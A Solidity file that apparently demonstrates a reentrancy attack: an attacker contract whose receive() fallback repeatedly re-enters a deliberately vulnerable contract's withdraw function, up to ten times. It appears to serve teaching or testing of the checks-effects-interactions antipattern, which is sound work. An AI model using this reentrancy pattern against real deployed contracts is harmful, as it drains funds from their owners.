// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

import './ChecksEffectsInteractionsAntipattern.sol';

contract AttackerAntiChecksEffects {
  ChecksEffectsInteractionsAntipattern v;
  uint256 public count;
  uint amount = 1 ether;
  address payable public victimAddress;

  event LogFallback(uint c, uint balance);

  constructor (ChecksEffectsInteractionsAntipattern victim) {
    victimAddress = address(victim);
    v = ChecksEffectsInteractionsAntipattern(victimAddress);
  }

  function setBalance() public payable {
    (bool success, ) = victimAddress.call{value: msg.value}("");
    require(success);
  }

  function attack() public {
    v.withdraw(amount);
  }

  receive() external payable {
    count++;

    emit LogFallback(count, address(this).balance);
    if (count < 10) {
      v.withdraw(amount);
    } 
  }
}